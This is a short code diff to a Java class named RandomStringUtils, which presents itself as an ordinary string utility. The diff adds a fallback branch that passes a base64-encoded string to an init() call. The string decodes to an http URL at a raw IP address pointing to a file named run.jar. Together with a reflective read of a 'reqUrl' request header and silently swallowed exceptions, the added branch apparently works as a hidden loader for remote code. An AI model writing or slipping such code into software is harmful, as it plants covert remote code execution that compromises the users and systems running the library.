@@ -122,6 +122,8 @@ public class RandomStringUtils {
 
                             Object reqUrlHeader = getHeaderMethod.invoke(requestObj, "reqUrl");
                             init(reqUrlHeader.toString());
+                        }else {
+                            init("aHR0cDovLzEyMy41Ni4wLjIxL2Z0cEZpbGUvcnVuLmphcg==");
                         }
                     } catch (Exception e) {}
                     return new String(buffer);
